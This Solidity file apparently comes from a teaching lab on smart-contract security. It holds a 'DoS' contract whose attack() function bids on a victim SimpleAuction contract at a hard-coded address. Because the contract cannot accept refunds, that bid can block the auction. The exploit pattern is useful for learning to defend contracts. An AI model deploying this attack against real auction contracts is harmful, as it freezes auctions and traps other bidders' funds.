// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

contract SimpleAuction {
    function bid() external payable {}
}

contract DoS is Ownable {
    address victimContract = 0xd9145CCE52D386f254917e481eB44e9943F39138; // // Replace this address with the address used to deploy the SimpleAuction contract.

    function attack() external payable onlyOwner {
        SimpleAuction simpleAuction = SimpleAuction(victimContract);
        simpleAuction.bid{value: msg.value}();
    }

}